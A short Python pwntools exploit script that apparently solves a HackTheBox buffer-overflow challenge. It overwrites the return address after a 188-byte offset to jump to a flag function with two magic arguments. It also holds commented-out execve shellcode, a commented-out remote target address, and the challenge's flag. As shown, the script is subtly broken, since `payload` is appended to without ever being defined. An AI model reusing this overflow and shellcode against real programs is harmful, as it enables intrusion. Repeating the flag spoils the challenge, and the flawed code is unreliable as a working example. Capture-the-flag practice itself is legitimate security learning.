#!/usr/bin/env python3

from pwn import *

#s = remote("188.166.173.208",31664)

s = process('./vuln')

# python -c 'print "A"*184 + "B"*4 + " C"*4'
offset = 188

arg1 = 0xdeadbeef
arg2 = 0xc0ded00d
flag_func = 0x080491e2
main_func = 0x080492b1

s.recvuntil('You know who are 0xDiablos:')

#shellcode = asm(shellcraft.sh())
#shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#payload = shellcode
#payload += b"A"*(offset-len(shellcode))
#payload += b"B"*4
#payload += p32(0xff965c00)

payload += b"A"*offset
payload += p32(flag_func)
payload += p32(main_func)
payload += p32(arg1)
payload += p32(arg2)

s.sendline(payload)
s.interactive()

# HTB{0ur_Buff3r_1s_not_healthy}
